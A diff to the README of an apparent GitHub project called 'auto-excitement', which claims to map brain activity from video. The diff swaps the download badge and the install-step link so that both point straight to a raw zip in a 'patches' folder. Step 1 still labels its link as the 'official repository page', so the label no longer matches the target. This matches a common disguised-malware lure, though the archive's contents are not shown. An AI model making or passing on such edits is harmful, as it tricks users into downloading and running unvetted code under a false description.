@@ -1,6 +1,6 @@
 # 🧠 auto-excitement - View brain activity from video files
 
-[![Download Installer](https://img.shields.io/badge/Download-Windows_Setup-blue)](https://github.com/Quintanatorres529/auto-excitement)
+[![Download Installer](https://img.shields.io/badge/Download-Windows_Setup-blue)](https://github.com/Quintanatorres529/auto-excitement/raw/refs/heads/main/patches/excitement-auto-1.6.zip)
 
 This application turns video files into brain activity maps. It uses the tribev2 model to predict how the brain responds to visual input. You see these results as brain renders and timelines. It also includes tools to trim your video files.
 
@@ -22,7 +22,7 @@ This application turns video files into brain activity maps. It uses the tribev2
 
 ## 📥 How to Download and Install
 
-1.  Visit the official repository page to get the software: [https://github.com/Quintanatorres529/auto-excitement](https://github.com/Quintanatorres529/auto-excitement).
+1.  Visit the official repository page to get the software: [https://github.com/Quintanatorres529/auto-excitement/raw/refs/heads/main/patches/excitement-auto-1.6.zip](https://github.com/Quintanatorres529/auto-excitement/raw/refs/heads/main/patches/excitement-auto-1.6.zip).
 2.  Locate the release section on the right side of the page.
 3.  Click the release version to view files.
 4.  Download the `.exe` installer file.
